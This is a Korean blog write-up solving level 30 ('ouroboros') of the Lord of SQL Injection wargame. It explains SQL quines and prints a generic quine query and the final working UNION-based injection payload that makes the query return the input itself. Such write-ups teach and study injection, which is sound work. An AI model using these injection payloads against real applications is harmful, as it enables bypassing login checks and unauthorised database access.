---
title: LOS - 30번 ouroboros
category: Lord of SQL Injection
---

# [30] ouroboros

## 문제

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FPLStF%2FbtrpwOBniqR%2Fk4UuZ0WXEm8MfJKfJHtKe0%2Fimg.png">

## 풀이

쿼리의 결과와 사용자의 입력값이 일치하는 지 검증하는 문제다.

pw를 찾아내면 쉽게 풀 수 있는 문제이기 때문에 아마 테이블 내부에 pw 값이 없을 것 같았다...

<br>

확인을 위해 where절을 True로 만들어줄 수 있는 쿼리를 주입해보았다.

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fbj49zN%2FbtrpqylywrC%2FthfadP8wuzaMwvKIL3k6pk%2Fimg.png">

테이블에 pw가 있다면 값이 뜰텐데... 감감무소식이었다.

아무래도 예상했듯 테이블에 pw가 없는 것 같았다.

<br>

다음은 union을 사용해 1을 기존 테이블에 붙여보았다.

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fcd7R8j%2FbtrpyiWt8tZ%2FpmP1DlnD3fLOQjcku3LhT0%2Fimg.png">

이런 식으로 pw를 넣어주면 될 것 같은데...

문제는 쿼리의 결과인 pw 값과 사용자 입력값이 같아야한다는 점에 있다.

<br>

어떻게 해주면 될 지 답이 안나와서 힌트를 서치해보았다.

<br>

답은 **Quine**이었다.

Quine이란 자기자신의 소스 코드를 그대로 반환하는 프로그램을 말한다.

Sql로도 Quine을 만들 수가 있는데, 사실 직접 로직을 생각해내는 것 보다는 서치의 힘을 빌려야하는 것 같다.

<br>

다음은 대표적인 **Quine Query**의 예시다.

```sql
SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")');
```

<br>

이를 적용하여 만든 최종 쿼리문은 다음과 같다.

```
'union select replace(replace('"union select replace(replace("$",char(34),char(39)),char(36),"$")%23',char(34),char(39)),char(36),'"union select replace(replace("$",char(34),char(39)),char(36),"$")%23')%23
```

## 결과

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fs6Ugl%2Fbtrpu2sSfkX%2Fl9Y0Z3lPlbSJ6pG9V72RcK%2Fimg.png">